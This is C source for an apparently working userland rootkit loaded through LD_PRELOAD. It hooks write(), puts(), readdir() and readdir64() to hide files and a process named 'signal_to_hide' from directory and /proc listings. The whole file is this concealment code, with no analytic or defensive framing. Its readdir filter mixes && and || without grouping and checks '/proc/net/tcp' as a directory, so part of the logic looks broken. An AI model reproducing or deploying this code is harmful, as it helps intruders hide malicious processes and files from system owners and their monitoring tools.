#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>


#define _GNU_SOURCE
static const char* pf = "signal_to_hide"; // change here
#define FILENAME "signal_to_hide" //





// for write() 
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
     ssize_t result;
     new_write = dlsym(RTLD_NEXT, "write");
     if (strncmp(buf, FILENAME,strlen(FILENAME)) == 0)
     {
          result = new_write(fildes, "", strlen(""));
     }
     else
     {
          result = new_write(fildes, buf, nbytes);
     }
     return result;
}



//  for puts()

int puts(const char *message){
     
            int (*original_puts)(const char *message);
            int result;
            
            original_puts = dlsym(RTLD_NEXT, "puts");
            if(strcmp(message, FILENAME) == 0) 
                result = original_puts("");
            else
                result = original_puts(message); 
     
            return result;
}








static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}



//pid-pname
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 || strcmp(dir_name, "/proc/net/tcp") ==0  &&                       \
                get_process_name(dir->d_name, process_name)&&           \
                strcmp(process_name, pf) == 0)  {                        \
                continue;                                               \
            }  if(dir ) {                                         \
            if (strcmp(dir->d_name,FILENAME) == 0) {continue;}          \
                                        \
                                \
        }break;                                                          \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
